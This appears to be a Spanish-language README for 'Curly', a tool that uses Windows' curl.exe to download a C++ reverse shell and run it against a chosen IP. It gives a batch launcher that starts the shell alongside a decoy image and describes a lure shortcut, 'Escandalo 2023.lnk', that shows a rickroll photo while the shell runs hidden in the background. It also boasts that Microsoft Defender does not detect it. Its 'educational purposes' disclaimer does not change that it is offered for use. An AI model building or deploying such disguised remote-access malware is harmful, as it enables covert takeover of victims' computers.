## Curly

Herramienta que descarga una revershell escrita en c++ usando la herramienta curl.exe incorporada en versiones modernas de Windows y la ejecuta contra la IP definida

### Modo de empleo

Configura tu IP local dentro del archivo _starter.bat_

```
@echo off
start "" .\curly_args.exe 192.168.0.72
start "" ".\rickroll.jpg"
```

El punto de entrada del programa es _Escandalo 2023.lnk_ que abre una foto (rickroll.jpg) y la reverse shell en segundo plano

### Deteccion de antivirus

A la fecha 07/06/23 corriendo la ultima version de Microsoft Defender no lo detecta como archivo malicioso

##### Disclaimer

Esto se realizo con fines educativos y practicos, cualquier uso indebido es responsabilidad del usuario
